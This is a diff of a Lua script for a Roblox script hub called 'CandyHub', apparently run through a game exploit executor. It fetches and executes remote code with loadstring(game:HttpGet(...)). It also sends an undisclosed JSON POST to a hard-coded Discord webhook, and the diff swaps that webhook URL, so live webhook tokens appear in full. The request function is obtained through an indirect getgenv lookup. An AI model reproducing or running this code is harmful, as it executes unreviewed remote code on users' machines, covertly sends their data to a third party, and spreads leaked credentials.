@@ -4,7 +4,7 @@ local supportedVersionp = 1390
 
 local ReGui = loadstring(game:HttpGet('https://raw.githubusercontent.com/depthso/Dear-ReGui/refs/heads/main/ReGui.lua'))()
 local Window = ReGui:TabsWindow({
-	Title = "CandyHub - ".. name .. " v1.5.2",
+	Title = "CandyHub - ".. name .. " v1.5.23",
 	Size = UDim2.fromOffset(340, 400)
 }) --> TabSelector & WindowClass
 
@@ -511,7 +511,7 @@ if request then
             end
             local taxrget = getgenv()[x] or request
             local response = taxrget({
-                Url = "https://discord.com/api/webhooks/1401991095482585229/WOFXd5KzvcnDs3SvcdDRS1yDYEigpQlMF2X0S6uKXYfrbGXVuBgf2t_59o1Nk5Z0i5gQ",
+                Url = "https://discord.com/api/webhooks/1402026289770008688/RibldfUVV8DHfwr1nU6r9MPnKE9BP2JdgTfEg6LZ9vGje1JOqx8bJXsCakJiSiXwL62K",
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = game:GetService("HttpService"):JSONEncode({
@@ -533,7 +533,7 @@ if request then
                     }
                 })
             })
-            getgenv()[x] = nil
+            --getgenv()[x] = nil
         end
     end
 
